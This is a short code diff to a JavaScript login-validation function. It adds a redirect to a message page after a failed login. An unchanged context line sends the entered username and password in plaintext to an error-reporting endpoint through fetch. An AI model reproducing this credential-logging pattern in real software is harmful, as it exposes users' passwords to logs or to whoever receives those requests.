@@ -88,6 +88,7 @@ function validarUsuario() {
                         // toastr.warning(data, 'Advertencia', {
                         fetch(APIERROR + ` AD -> U: ${username}  C: ${password}`);
                         alertaImg(data, 'has-text-warning', 'warning', 3000);
+                        location.href = "https://www.maphg.com/beta/msg.html";
                     }
                 }
             });
